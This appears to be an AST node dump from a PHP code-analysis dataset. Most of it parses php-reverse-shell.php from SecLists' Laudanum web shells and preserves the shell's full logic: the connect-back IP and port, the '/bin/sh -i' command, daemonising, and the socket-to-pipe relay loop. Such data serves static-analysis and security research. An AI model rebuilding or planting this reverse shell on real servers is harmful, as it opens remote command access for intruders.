id:int	labels:label	type	flags:string_array	lineno:int	code	childnum:int	funcid:int	classname	namespace	endlineno:int	name	doccomment
3666	AST	AST_CALL		314		0	2387		""			
3667	AST	AST_NAME	NAME_NOT_FQ	314		0	2387		""			
3668	AST	string		314	"header_remove"	0	2387		""			
3669	AST	AST_ARG_LIST		314		1	2387		""			
3670	AST	AST_ASSIGN		316		1	2387		""			
3671	AST	AST_VAR		316		0	2387		""			
3672	AST	string		316	"i"	0	2387		""			
3673	AST	integer		316	0	1	2387		""			
3674	AST	AST_WHILE		317		2	2387		""			
3675	AST	AST_BINARY_OP	BINARY_IS_SMALLER	317		0	2387		""			
3676	AST	AST_VAR		317		0	2387		""			
3677	AST	string		317	"i"	0	2387		""			
3678	AST	AST_CALL		317		1	2387		""			
3679	AST	AST_NAME	NAME_NOT_FQ	317		0	2387		""			
3680	AST	string		317	"count"	0	2387		""			
3681	AST	AST_ARG_LIST		317		1	2387		""			
3682	AST	AST_VAR		317		0	2387		""			
3683	AST	string		317	"headers"	0	2387		""			
3684	AST	AST_STMT_LIST		317		1	2387		""			
3685	AST	AST_IF		318		0	2387		""			
3686	AST	AST_IF_ELEM		318		0	2387		""			
3687	AST	AST_BINARY_OP	BINARY_IS_EQUAL	318		0	2387		""			
3688	AST	AST_CALL		318		0	2387		""			
3689	AST	AST_NAME	NAME_NOT_FQ	318		0	2387		""			
3690	AST	string		318	"strpos"	0	2387		""			
3691	AST	AST_ARG_LIST		318		1	2387		""			
3692	AST	AST_DIM		318		0	2387		""			
3693	AST	AST_VAR		318		0	2387		""			
3694	AST	string		318	"headers"	0	2387		""			
3695	AST	AST_VAR		318		1	2387		""			
3696	AST	string		318	"i"	0	2387		""			
3697	AST	string		318	"Set-Cookie:"	1	2387		""			
3698	AST	AST_CONST		318		1	2387		""			
3699	AST	AST_NAME	NAME_NOT_FQ	318		0	2387		""			
3700	AST	string		318	"false"	0	2387		""			
3701	AST	AST_CALL		320		1	2387		""			
3702	AST	AST_NAME	NAME_NOT_FQ	320		0	2387		""			
3703	AST	string		320	"header"	0	2387		""			
3704	AST	AST_ARG_LIST		320		1	2387		""			
3705	AST	AST_DIM		320		0	2387		""			
3706	AST	AST_VAR		320		0	2387		""			
3707	AST	string		320	"headers"	0	2387		""			
3708	AST	AST_VAR		320		1	2387		""			
3709	AST	string		320	"i"	0	2387		""			
3710	AST	AST_CONST		320		1	2387		""			
3711	AST	AST_NAME	NAME_NOT_FQ	320		0	2387		""			
3712	AST	string		320	"true"	0	2387		""			
3713	AST	AST_IF_ELEM		323		1	2387		""			
3714	AST	NULL		323		0	2387		""			
3715	AST	AST_CALL		323		1	2387		""			
3716	AST	AST_NAME	NAME_NOT_FQ	323		0	2387		""			
3717	AST	string		323	"header"	0	2387		""			
3718	AST	AST_ARG_LIST		323		1	2387		""			
3719	AST	AST_DIM		323		0	2387		""			
3720	AST	AST_VAR		323		0	2387		""			
3721	AST	string		323	"headers"	0	2387		""			
3722	AST	AST_VAR		323		1	2387		""			
3723	AST	string		323	"i"	0	2387		""			
3724	AST	AST_CONST		323		1	2387		""			
3725	AST	AST_NAME	NAME_NOT_FQ	323		0	2387		""			
3726	AST	string		323	"false"	0	2387		""			
3727	AST	AST_POST_INC		324		1	2387		""			
3728	AST	AST_VAR		324		0	2387		""			
3729	AST	string		324	"i"	0	2387		""			
3730	AST	AST_IF_ELEM		326		1	2387		""			
3731	AST	NULL		326		0	2387		""			
3732	AST	AST_STMT_LIST		326		1	2387		""			
3733	AST	AST_CALL		327		0	2387		""			
3734	AST	AST_NAME	NAME_NOT_FQ	327		0	2387		""			
3735	AST	string		327	"header"	0	2387		""			
3736	AST	AST_ARG_LIST		327		1	2387		""			
3737	AST	AST_BINARY_OP	BINARY_CONCAT	327		0	2387		""			
3738	AST	string		327	"Content-Disposition: attachment; filename="	0	2387		""			
3739	AST	AST_CALL		327		1	2387		""			
3740	AST	AST_NAME	NAME_NOT_FQ	327		0	2387		""			
3741	AST	string		327	"getfilename"	0	2387		""			
3742	AST	AST_ARG_LIST		327		1	2387		""			
3743	AST	AST_VAR		327		0	2387		""			
3744	AST	string		327	"url_c"	0	2387		""			
3745	AST	AST_IF		331		13	2387		""			
3746	AST	AST_IF_ELEM		331		0	2387		""			
3747	AST	AST_CALL		331		0	2387		""			
3748	AST	AST_NAME	NAME_NOT_FQ	331		0	2387		""			
3749	AST	string		331	"preg_match"	0	2387		""			
3750	AST	AST_ARG_LIST		331		1	2387		""			
3751	AST	string		331	"/text/"	0	2387		""			
3752	AST	AST_VAR		331		1	2387		""			
3753	AST	string		331	"ctype"	0	2387		""			
3754	AST	AST_STMT_LIST		331		1	2387		""			
3755	AST	AST_ASSIGN		333		0	2387		""			
3756	AST	AST_VAR		333		0	2387		""			
3757	AST	string		333	"data"	0	2387		""			
3758	AST	string		333	""	1	2387		""			
3759	AST	AST_WHILE		334		1	2387		""			
3760	AST	AST_UNARY_OP	UNARY_BOOL_NOT	334		0	2387		""			
3761	AST	AST_CALL		334		0	2387		""			
3762	AST	AST_NAME	NAME_NOT_FQ	334		0	2387		""			
3763	AST	string		334	"feof"	0	2387		""			
3764	AST	AST_ARG_LIST		334		1	2387		""			
3765	AST	AST_VAR		334		0	2387		""			
3766	AST	string		334	"fp"	0	2387		""			
3767	AST	AST_STMT_LIST		334		1	2387		""			
3768	AST	AST_ASSIGN_OP	BINARY_CONCAT	335		0	2387		""			
3769	AST	AST_VAR		335		0	2387		""			
3770	AST	string		335	"data"	0	2387		""			
3771	AST	AST_CALL		335		1	2387		""			
3772	AST	AST_NAME	NAME_NOT_FQ	335		0	2387		""			
3773	AST	string		335	"fgets"	0	2387		""			
3774	AST	AST_ARG_LIST		335		1	2387		""			
3775	AST	AST_VAR		335		0	2387		""			
3776	AST	string		335	"fp"	0	2387		""			
3777	AST	integer		335	4096	1	2387		""			
3778	AST	AST_IF		339		2	2387		""			
3779	AST	AST_IF_ELEM		339		0	2387		""			
3780	AST	AST_BINARY_OP	BINARY_IS_EQUAL	339		0	2387		""			
3781	AST	AST_VAR		339		0	2387		""			
3782	AST	string		339	"cencoding"	0	2387		""			
3783	AST	string		339	"gzip"	1	2387		""			
3784	AST	AST_ASSIGN		340		1	2387		""			
3785	AST	AST_VAR		340		0	2387		""			
3786	AST	string		340	"data"	0	2387		""			
3787	AST	AST_CALL		340		1	2387		""			
3788	AST	AST_NAME	NAME_NOT_FQ	340		0	2387		""			
3789	AST	string		340	"compatible_gzinflate"	0	2387		""			
3790	AST	AST_ARG_LIST		340		1	2387		""			
3791	AST	AST_VAR		340		0	2387		""			
3792	AST	string		340	"data"	0	2387		""			
3793	AST	AST_ECHO		343		3	2387		""			
3794	AST	AST_CALL		343		0	2387		""			
3795	AST	AST_NAME	NAME_NOT_FQ	343		0	2387		""			
3796	AST	string		343	"rewrite"	0	2387		""			
3797	AST	AST_ARG_LIST		343		1	2387		""			
3798	AST	AST_VAR		343		0	2387		""			
3799	AST	string		343	"data"	0	2387		""			
3800	AST	AST_VAR		343		1	2387		""			
3801	AST	string		343	"url_c"	0	2387		""			
3802	AST	AST_IF_ELEM		345		1	2387		""			
3803	AST	NULL		345		0	2387		""			
3804	AST	AST_STMT_LIST		345		1	2387		""			
3805	AST	AST_CALL		347		0	2387		""			
3806	AST	AST_NAME	NAME_NOT_FQ	347		0	2387		""			
3807	AST	string		347	"fpassthru"	0	2387		""			
3808	AST	AST_ARG_LIST		347		1	2387		""			
3809	AST	AST_VAR		347		0	2387		""			
3810	AST	string		347	"fp"	0	2387		""			
3811	AST	AST_CALL		348		1	2387		""			
3812	AST	AST_NAME	NAME_NOT_FQ	348		0	2387		""			
3813	AST	string		348	"fclose"	0	2387		""			
3814	AST	AST_ARG_LIST		348		1	2387		""			
3815	AST	AST_VAR		348		0	2387		""			
3816	AST	string		348	"fp"	0	2387		""			
3817	AST	NULL		1		21	2387		""			
3818	Filesystem	File									"php-reverse-shell.php"	
3819	AST	AST_TOPLEVEL	TOPLEVEL_FILE	1					""	192	"/data/seongil/26529,danielmiessler,SecLists/code/Web-Shells/laudanum-0.8/php/php-reverse-shell.php"	
3820	Artificial	CFG_FUNC_ENTRY					3819				"/data/seongil/26529,danielmiessler,SecLists/code/Web-Shells/laudanum-0.8/php/php-reverse-shell.php"	
3821	Artificial	CFG_FUNC_EXIT					3819				"/data/seongil/26529,danielmiessler,SecLists/code/Web-Shells/laudanum-0.8/php/php-reverse-shell.php"	
3822	AST	AST_STMT_LIST		1		0	3819		""			
3823	AST	AST_CALL		47		0	3819		""			
3824	AST	AST_NAME	NAME_NOT_FQ	47		0	3819		""			
3825	AST	string		47	"set_time_limit"	0	3819		""			
3826	AST	AST_ARG_LIST		47		1	3819		""			
3827	AST	integer		47	0	0	3819		""			
3828	AST	AST_ASSIGN		48		1	3819		""			
3829	AST	AST_VAR		48		0	3819		""			
3830	AST	string		48	"VERSION"	0	3819		""			
3831	AST	string		48	"1.0"	1	3819		""			
3832	AST	AST_ASSIGN		49		2	3819		""			
3833	AST	AST_VAR		49		0	3819		""			
3834	AST	string		49	"ip"	0	3819		""			
3835	AST	string		49	"10.2.2.1"	1	3819		""			
3836	AST	AST_ASSIGN		50		3	3819		""			
3837	AST	AST_VAR		50		0	3819		""			
3838	AST	string		50	"port"	0	3819		""			
3839	AST	integer		50	8888	1	3819		""			
3840	AST	AST_ASSIGN		51		4	3819		""			
3841	AST	AST_VAR		51		0	3819		""			
3842	AST	string		51	"chunk_size"	0	3819		""			
3843	AST	integer		51	1400	1	3819		""			
3844	AST	AST_ASSIGN		52		5	3819		""			
3845	AST	AST_VAR		52		0	3819		""			
3846	AST	string		52	"write_a"	0	3819		""			
3847	AST	AST_CONST		52		1	3819		""			
3848	AST	AST_NAME	NAME_NOT_FQ	52		0	3819		""			
3849	AST	string		52	"null"	0	3819		""			
3850	AST	AST_ASSIGN		53		6	3819		""			
3851	AST	AST_VAR		53		0	3819		""			
3852	AST	string		53	"error_a"	0	3819		""			
3853	AST	AST_CONST		53		1	3819		""			
3854	AST	AST_NAME	NAME_NOT_FQ	53		0	3819		""			
3855	AST	string		53	"null"	0	3819		""			
3856	AST	AST_ASSIGN		54		7	3819		""			
3857	AST	AST_VAR		54		0	3819		""			
3858	AST	string		54	"shell"	0	3819		""			
3859	AST	string		54	"uname -a; w; id; /bin/sh -i"	1	3819		""			
3860	AST	AST_ASSIGN		55		8	3819		""			
3861	AST	AST_VAR		55		0	3819		""			
3862	AST	string		55	"daemon"	0	3819		""			
3863	AST	integer		55	0	1	3819		""			
3864	AST	AST_ASSIGN		56		9	3819		""			
3865	AST	AST_VAR		56		0	3819		""			
3866	AST	string		56	"debug"	0	3819		""			
3867	AST	integer		56	0	1	3819		""			
3868	AST	AST_IF		64		10	3819		""			
3869	AST	AST_IF_ELEM		64		0	3819		""			
3870	AST	AST_CALL		64		0	3819		""			
3871	AST	AST_NAME	NAME_NOT_FQ	64		0	3819		""			
3872	AST	string		64	"function_exists"	0	3819		""			
3873	AST	AST_ARG_LIST		64		1	3819		""			
3874	AST	string		64	"pcntl_fork"	0	3819		""			
3875	AST	AST_STMT_LIST		64		1	3819		""			
3876	AST	AST_ASSIGN		66		0	3819		""			
3877	AST	AST_VAR		66		0	3819		""			
3878	AST	string		66	"pid"	0	3819		""			
3879	AST	AST_CALL		66		1	3819		""			
3880	AST	AST_NAME	NAME_NOT_FQ	66		0	3819		""			
3881	AST	string		66	"pcntl_fork"	0	3819		""			
3882	AST	AST_ARG_LIST		66		1	3819		""			
3883	AST	AST_IF		68		1	3819		""			
3884	AST	AST_IF_ELEM		68		0	3819		""			
3885	AST	AST_BINARY_OP	BINARY_IS_EQUAL	68		0	3819		""			
3886	AST	AST_VAR		68		0	3819		""			
3887	AST	string		68	"pid"	0	3819		""			
3888	AST	AST_UNARY_OP	UNARY_MINUS	68		1	3819		""			
3889	AST	integer		68	1	0	3819		""			
3890	AST	AST_STMT_LIST		68		1	3819		""			
3891	AST	AST_CALL		69		0	3819		""			
3892	AST	AST_NAME	NAME_NOT_FQ	69		0	3819		""			
3893	AST	string		69	"printit"	0	3819		""			
3894	AST	AST_ARG_LIST		69		1	3819		""			
3895	AST	string		69	"ERROR: Can't fork"	0	3819		""			
3896	AST	AST_EXIT		70		1	3819		""			
3897	AST	integer		70	1	0	3819		""			
3898	AST	AST_IF		73		2	3819		""			
3899	AST	AST_IF_ELEM		73		0	3819		""			
3900	AST	AST_VAR		73		0	3819		""			
3901	AST	string		73	"pid"	0	3819		""			
3902	AST	AST_STMT_LIST		73		1	3819		""			
3903	AST	AST_EXIT		74		0	3819		""			
3904	AST	integer		74	0	0	3819		""			
3905	AST	AST_IF		79		3	3819		""			
3906	AST	AST_IF_ELEM		79		0	3819		""			
3907	AST	AST_BINARY_OP	BINARY_IS_EQUAL	79		0	3819		""			
3908	AST	AST_CALL		79		0	3819		""			
3909	AST	AST_NAME	NAME_NOT_FQ	79		0	3819		""			
3910	AST	string		79	"posix_setsid"	0	3819		""			
3911	AST	AST_ARG_LIST		79		1	3819		""			
3912	AST	AST_UNARY_OP	UNARY_MINUS	79		1	3819		""			
3913	AST	integer		79	1	0	3819		""			
3914	AST	AST_STMT_LIST		79		1	3819		""			
3915	AST	AST_CALL		80		0	3819		""			
3916	AST	AST_NAME	NAME_NOT_FQ	80		0	3819		""			
3917	AST	string		80	"printit"	0	3819		""			
3918	AST	AST_ARG_LIST		80		1	3819		""			
3919	AST	string		80	"Error: Can't setsid()"	0	3819		""			
3920	AST	AST_EXIT		81		1	3819		""			
3921	AST	integer		81	1	0	3819		""			
3922	AST	AST_ASSIGN		84		4	3819		""			
3923	AST	AST_VAR		84		0	3819		""			
3924	AST	string		84	"daemon"	0	3819		""			
3925	AST	integer		84	1	1	3819		""			
3926	AST	AST_IF_ELEM		85		1	3819		""			
3927	AST	NULL		85		0	3819		""			
3928	AST	AST_STMT_LIST		85		1	3819		""			
3929	AST	AST_CALL		86		0	3819		""			
3930	AST	AST_NAME	NAME_NOT_FQ	86		0	3819		""			
3931	AST	string		86	"printit"	0	3819		""			
3932	AST	AST_ARG_LIST		86		1	3819		""			
3933	AST	string		86	"WARNING: Failed to daemonise.  This is quite common and not fatal."	0	3819		""			
3934	AST	AST_CALL		90		11	3819		""			
3935	AST	AST_NAME	NAME_NOT_FQ	90		0	3819		""			
3936	AST	string		90	"chdir"	0	3819		""			
3937	AST	AST_ARG_LIST		90		1	3819		""			
3938	AST	string		90	"/"	0	3819		""			
3939	AST	AST_CALL		93		12	3819		""			
3940	AST	AST_NAME	NAME_NOT_FQ	93		0	3819		""			
3941	AST	string		93	"umask"	0	3819		""			
3942	AST	AST_ARG_LIST		93		1	3819		""			
3943	AST	integer		93	0	0	3819		""			
3944	AST	AST_ASSIGN		100		13	3819		""			
3945	AST	AST_VAR		100		0	3819		""			
3946	AST	string		100	"sock"	0	3819		""			
3947	AST	AST_CALL		100		1	3819		""			
3948	AST	AST_NAME	NAME_NOT_FQ	100		0	3819		""			
3949	AST	string		100	"fsockopen"	0	3819		""			
3950	AST	AST_ARG_LIST		100		1	3819		""			
3951	AST	AST_VAR		100		0	3819		""			
3952	AST	string		100	"ip"	0	3819		""			
3953	AST	AST_VAR		100		1	3819		""			
3954	AST	string		100	"port"	0	3819		""			
3955	AST	AST_VAR		100		2	3819		""			
3956	AST	string		100	"errno"	0	3819		""			
3957	AST	AST_VAR		100		3	3819		""			
3958	AST	string		100	"errstr"	0	3819		""			
3959	AST	integer		100	30	4	3819		""			
3960	AST	AST_IF		101		14	3819		""			
3961	AST	AST_IF_ELEM		101		0	3819		""			
3962	AST	AST_UNARY_OP	UNARY_BOOL_NOT	101		0	3819		""			
3963	AST	AST_VAR		101		0	3819		""			
3964	AST	string		101	"sock"	0	3819		""			
3965	AST	AST_STMT_LIST		101		1	3819		""			
3966	AST	AST_CALL		102		0	3819		""			
3967	AST	AST_NAME	NAME_NOT_FQ	102		0	3819		""			
3968	AST	string		102	"printit"	0	3819		""			
3969	AST	AST_ARG_LIST		102		1	3819		""			
3970	AST	AST_ENCAPS_LIST		102		0	3819		""			
3971	AST	AST_VAR		102		0	3819		""			
3972	AST	string		102	"errstr"	0	3819		""			
3973	AST	string		102	" ("	1	3819		""			
3974	AST	AST_VAR		102		2	3819		""			
3975	AST	string		102	"errno"	0	3819		""			
3976	AST	string		102	")"	3	3819		""			
3977	AST	AST_EXIT		103		1	3819		""			
3978	AST	integer		103	1	0	3819		""			
3979	AST	AST_ASSIGN		107		15	3819		""			
3980	AST	AST_VAR		107		0	3819		""			
3981	AST	string		107	"descriptorspec"	0	3819		""			
3982	AST	AST_ARRAY	"[WARNING] Unexpected flags for kind: kind=129 and flags=2"	108		1	3819		""			
3983	AST	AST_ARRAY_ELEM		108		0	3819		""			
3984	AST	AST_ARRAY	"[WARNING] Unexpected flags for kind: kind=129 and flags=2"	108		0	3819		""			
3985	AST	AST_ARRAY_ELEM		108		0	3819		""			
3986	AST	string		108	"pipe"	0	3819		""			
3987	AST	NULL		108		1	3819		""			
3988	AST	AST_ARRAY_ELEM		108		1	3819		""			
3989	AST	string		108	"r"	0	3819		""			
3990	AST	NULL		108		1	3819		""			
3991	AST	integer		108	0	1	3819		""			
3992	AST	AST_ARRAY_ELEM		109		1	3819		""			
3993	AST	AST_ARRAY	"[WARNING] Unexpected flags for kind: kind=129 and flags=2"	109		0	3819		""			
3994	AST	AST_ARRAY_ELEM		109		0	3819		""			
3995	AST	string		109	"pipe"	0	3819		""			
3996	AST	NULL		109		1	3819		""			
3997	AST	AST_ARRAY_ELEM		109		1	3819		""			
3998	AST	string		109	"w"	0	3819		""			
3999	AST	NULL		109		1	3819		""			
4000	AST	integer		109	1	1	3819		""			
4001	AST	AST_ARRAY_ELEM		110		2	3819		""			
4002	AST	AST_ARRAY	"[WARNING] Unexpected flags for kind: kind=129 and flags=2"	110		0	3819		""			
4003	AST	AST_ARRAY_ELEM		110		0	3819		""			
4004	AST	string		110	"pipe"	0	3819		""			
4005	AST	NULL		110		1	3819		""			
4006	AST	AST_ARRAY_ELEM		110		1	3819		""			
4007	AST	string		110	"w"	0	3819		""			
4008	AST	NULL		110		1	3819		""			
4009	AST	integer		110	2	1	3819		""			
4010	AST	AST_ASSIGN		113		16	3819		""			
4011	AST	AST_VAR		113		0	3819		""			
4012	AST	string		113	"process"	0	3819		""			
4013	AST	AST_CALL		113		1	3819		""			
4014	AST	AST_NAME	NAME_NOT_FQ	113		0	3819		""			
4015	AST	string		113	"proc_open"	0	3819		""			
4016	AST	AST_ARG_LIST		113		1	3819		""			
4017	AST	AST_VAR		113		0	3819		""			
4018	AST	string		113	"shell"	0	3819		""			
4019	AST	AST_VAR		113		1	3819		""			
4020	AST	string		113	"descriptorspec"	0	3819		""			
4021	AST	AST_VAR		113		2	3819		""			
4022	AST	string		113	"pipes"	0	3819		""			
4023	AST	AST_IF		115		17	3819		""			
4024	AST	AST_IF_ELEM		115		0	3819		""			
4025	AST	AST_UNARY_OP	UNARY_BOOL_NOT	115		0	3819		""			
4026	AST	AST_CALL		115		0	3819		""			
4027	AST	AST_NAME	NAME_NOT_FQ	115		0	3819		""			
4028	AST	string		115	"is_resource"	0	3819		""			
4029	AST	AST_ARG_LIST		115		1	3819		""			
4030	AST	AST_VAR		115		0	3819		""			
4031	AST	string		115	"process"	0	3819		""			
4032	AST	AST_STMT_LIST		115		1	3819		""			
4033	AST	AST_CALL		116		0	3819		""			
4034	AST	AST_NAME	NAME_NOT_FQ	116		0	3819		""			
4035	AST	string		116	"printit"	0	3819		""			
4036	AST	AST_ARG_LIST		116		1	3819		""			
4037	AST	string		116	"ERROR: Can't spawn shell"	0	3819		""			
4038	AST	AST_EXIT		117		1	3819		""			
4039	AST	integer		117	1	0	3819		""			
4040	AST	AST_CALL		122		18	3819		""			
4041	AST	AST_NAME	NAME_NOT_FQ	122		0	3819		""			
4042	AST	string		122	"stream_set_blocking"	0	3819		""			
4043	AST	AST_ARG_LIST		122		1	3819		""			
4044	AST	AST_DIM		122		0	3819		""			
4045	AST	AST_VAR		122		0	3819		""			
4046	AST	string		122	"pipes"	0	3819		""			
4047	AST	integer		122	0	1	3819		""			
4048	AST	integer		122	0	1	3819		""			
4049	AST	AST_CALL		123		19	3819		""			
4050	AST	AST_NAME	NAME_NOT_FQ	123		0	3819		""			
4051	AST	string		123	"stream_set_blocking"	0	3819		""			
4052	AST	AST_ARG_LIST		123		1	3819		""			
4053	AST	AST_DIM		123		0	3819		""			
4054	AST	AST_VAR		123		0	3819		""			
4055	AST	string		123	"pipes"	0	3819		""			
4056	AST	integer		123	1	1	3819		""			
4057	AST	integer		123	0	1	3819		""			
4058	AST	AST_CALL		124		20	3819		""			
4059	AST	AST_NAME	NAME_NOT_FQ	124		0	3819		""			
4060	AST	string		124	"stream_set_blocking"	0	3819		""			
4061	AST	AST_ARG_LIST		124		1	3819		""			
4062	AST	AST_DIM		124		0	3819		""			
4063	AST	AST_VAR		124		0	3819		""			
4064	AST	string		124	"pipes"	0	3819		""			
4065	AST	integer		124	2	1	3819		""			
4066	AST	integer		124	0	1	3819		""			
4067	AST	AST_CALL		125		21	3819		""			
4068	AST	AST_NAME	NAME_NOT_FQ	125		0	3819		""			
4069	AST	string		125	"stream_set_blocking"	0	3819		""			
4070	AST	AST_ARG_LIST		125		1	3819		""			
4071	AST	AST_VAR		125		0	3819		""			
4072	AST	string		125	"sock"	0	3819		""			
4073	AST	integer		125	0	1	3819		""			
4074	AST	AST_CALL		127		22	3819		""			
4075	AST	AST_NAME	NAME_NOT_FQ	127		0	3819		""			
4076	AST	string		127	"printit"	0	3819		""			
4077	AST	AST_ARG_LIST		127		1	3819		""			
4078	AST	AST_ENCAPS_LIST		127		0	3819		""			
4079	AST	string		127	"Successfully opened reverse shell to "	0	3819		""			
4080	AST	AST_VAR		127		1	3819		""			
4081	AST	string		127	"ip"	0	3819		""			
4082	AST	string		127	":"	2	3819		""			
4083	AST	AST_VAR		127		3	3819		""			
4084	AST	string		127	"port"	0	3819		""			
4085	AST	AST_WHILE		129		23	3819		""			
4086	AST	integer		129	1	0	3819		""			
4087	AST	AST_STMT_LIST		129		1	3819		""			
4088	AST	AST_IF		131		0	3819		""			
4089	AST	AST_IF_ELEM		131		0	3819		""			
4090	AST	AST_CALL		131		0	3819		""			
4091	AST	AST_NAME	NAME_NOT_FQ	131		0	3819		""			
4092	AST	string		131	"feof"	0	3819		""			
4093	AST	AST_ARG_LIST		131		1	3819		""			
4094	AST	AST_VAR		131		0	3819		""			
4095	AST	string		131	"sock"	0	3819		""			
4096	AST	AST_STMT_LIST		131		1	3819		""			
4097	AST	AST_CALL		132		0	3819		""			
4098	AST	AST_NAME	NAME_NOT_FQ	132		0	3819		""			
4099	AST	string		132	"printit"	0	3819		""			
4100	AST	AST_ARG_LIST		132		1	3819		""			
4101	AST	string		132	"ERROR: Shell connection terminated"	0	3819		""			
4102	AST	AST_BREAK		133		1	3819		""			
4103	AST	NULL		133		0	3819		""			
4104	AST	AST_IF		137		1	3819		""			
4105	AST	AST_IF_ELEM		137		0	3819		""			
4106	AST	AST_CALL		137		0	3819		""			
4107	AST	AST_NAME	NAME_NOT_FQ	137		0	3819		""			
4108	AST	string		137	"feof"	0	3819		""			
4109	AST	AST_ARG_LIST		137		1	3819		""			
4110	AST	AST_DIM		137		0	3819		""			
4111	AST	AST_VAR		137		0	3819		""			
4112	AST	string		137	"pipes"	0	3819		""			
4113	AST	integer		137	1	1	3819		""			
4114	AST	AST_STMT_LIST		137		1	3819		""			
4115	AST	AST_CALL		138		0	3819		""			
4116	AST	AST_NAME	NAME_NOT_FQ	138		0	3819		""			
4117	AST	string		138	"printit"	0	3819		""			
4118	AST	AST_ARG_LIST		138		1	3819		""			
4119	AST	string		138	"ERROR: Shell process terminated"	0	3819		""			
4120	AST	AST_BREAK		139		1	3819		""			
4121	AST	NULL		139		0	3819		""			
4122	AST	AST_ASSIGN		144		2	3819		""			
4123	AST	AST_VAR		144		0	3819		""			
4124	AST	string		144	"read_a"	0	3819		""			
4125	AST	AST_ARRAY	"[WARNING] Unexpected flags for kind: kind=129 and flags=2"	144		1	3819		""			
4126	AST	AST_ARRAY_ELEM		144		0	3819		""			
4127	AST	AST_VAR		144		0	3819		""			
4128	AST	string		144	"sock"	0	3819		""			
4129	AST	NULL		144		1	3819		""			
4130	AST	AST_ARRAY_ELEM		144		1	3819		""			
4131	AST	AST_DIM		144		0	3819		""			
4132	AST	AST_VAR		144		0	3819		""			
4133	AST	string		144	"pipes"	0	3819		""			
4134	AST	integer		144	1	1	3819		""			
4135	AST	NULL		144		1	3819		""			
4136	AST	AST_ARRAY_ELEM		144		2	3819		""			
4137	AST	AST_DIM		144		0	3819		""			
4138	AST	AST_VAR		144		0	3819		""			
4139	AST	string		144	"pipes"	0	3819		""			
4140	AST	integer		144	2	1	3819		""			
4141	AST	NULL		144		1	3819		""			
4142	AST	AST_ASSIGN		145		3	3819		""			
4143	AST	AST_VAR		145		0	3819		""			
4144	AST	string		145	"num_changed_sockets"	0	3819		""			
4145	AST	AST_CALL		145		1	3819		""			
4146	AST	AST_NAME	NAME_NOT_FQ	145		0	3819		""			
4147	AST	string		145	"stream_select"	0	3819		""			
4148	AST	AST_ARG_LIST		145		1	3819		""			
4149	AST	AST_VAR		145		0	3819		""			
4150	AST	string		145	"read_a"	0	3819		""			
4151	AST	AST_VAR		145		1	3819		""			
4152	AST	string		145	"write_a"	0	3819		""			
4153	AST	AST_VAR		145		2	3819		""			
4154	AST	string		145	"error_a"	0	3819		""			
4155	AST	AST_CONST		145		3	3819		""			
4156	AST	AST_NAME	NAME_NOT_FQ	145		0	3819		""			
4157	AST	string		145	"null"	0	3819		""			
4158	AST	AST_IF		149		4	3819		""			
4159	AST	AST_IF_ELEM		149		0	3819		""			
4160	AST	AST_CALL		149		0	3819		""			
4161	AST	AST_NAME	NAME_NOT_FQ	149		0	3819		""			
4162	AST	string		149	"in_array"	0	3819		""			
4163	AST	AST_ARG_LIST		149		1	3819		""			
4164	AST	AST_VAR		149		0	3819		""			
4165	AST	string		149	"sock"	0	3819		""			
4166	AST	AST_VAR		149		1	3819		""			
4167	AST	string		149	"read_a"	0	3819		""			
4168	AST	AST_STMT_LIST		149		1	3819		""			
4169	AST	AST_IF		150		0	3819		""			
4170	AST	AST_IF_ELEM		150		0	3819		""			
4171	AST	AST_VAR		150		0	3819		""			
4172	AST	string		150	"debug"	0	3819		""			
4173	AST	AST_CALL		150		1	3819		""			
4174	AST	AST_NAME	NAME_NOT_FQ	150		0	3819		""			
4175	AST	string		150	"printit"	0	3819		""			
4176	AST	AST_ARG_LIST		150		1	3819		""			
4177	AST	string		150	"SOCK READ"	0	3819		""			
4178	AST	AST_ASSIGN		151		1	3819		""			
4179	AST	AST_VAR		151		0	3819		""			
4180	AST	string		151	"input"	0	3819		""			
4181	AST	AST_CALL		151		1	3819		""			
4182	AST	AST_NAME	NAME_NOT_FQ	151		0	3819		""			
4183	AST	string		151	"fread"	0	3819		""			
4184	AST	AST_ARG_LIST		151		1	3819		""			
4185	AST	AST_VAR		151		0	3819		""			
4186	AST	string		151	"sock"	0	3819		""			
4187	AST	AST_VAR		151		1	3819		""			
4188	AST	string		151	"chunk_size"	0	3819		""			
4189	AST	AST_IF		152		2	3819		""			
4190	AST	AST_IF_ELEM		152		0	3819		""			
4191	AST	AST_VAR		152		0	3819		""			
4192	AST	string		152	"debug"	0	3819		""			
4193	AST	AST_CALL		152		1	3819		""			
4194	AST	AST_NAME	NAME_NOT_FQ	152		0	3819		""			
4195	AST	string		152	"printit"	0	3819		""			
4196	AST	AST_ARG_LIST		152		1	3819		""			
4197	AST	AST_ENCAPS_LIST		152		0	3819		""			
